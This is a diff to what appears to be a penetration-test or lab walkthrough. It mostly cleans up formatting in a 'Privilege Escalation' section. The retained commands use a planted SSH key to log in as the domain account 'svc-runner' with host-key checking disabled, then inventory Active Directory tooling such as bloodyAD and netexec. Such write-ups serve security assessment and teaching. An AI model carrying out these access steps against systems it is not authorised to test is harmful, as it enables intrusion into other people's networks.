@@ -3074,23 +3074,17 @@ uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain us
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 4. Post-Exploitation
-
-### 4. Privilege Escalation
+## 4. Privilege Escalation
 
 #### 4.1 — Establish an interactive session as `svc-runner` and inventory directory tooling
 
-**Why this step:** The planted SSH key grants access as a domain account with membership in a non-default group. Obtain an interactive session and determine what tooling is available on the host for querying and modifying Active Directory.
+The planted SSH key grants access as a domain account with membership in a non-default group. Obtain an interactive session and determine what tooling is available on the host for querying and modifying Active Directory.
 
 **Commands:**
-
-bash
 
 ```bash
 ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
 ```
-
-bash
 
 ```bash
 which ldapsearch bloodyAD nxc netexec python3; ls /usr/bin | grep -i ldap
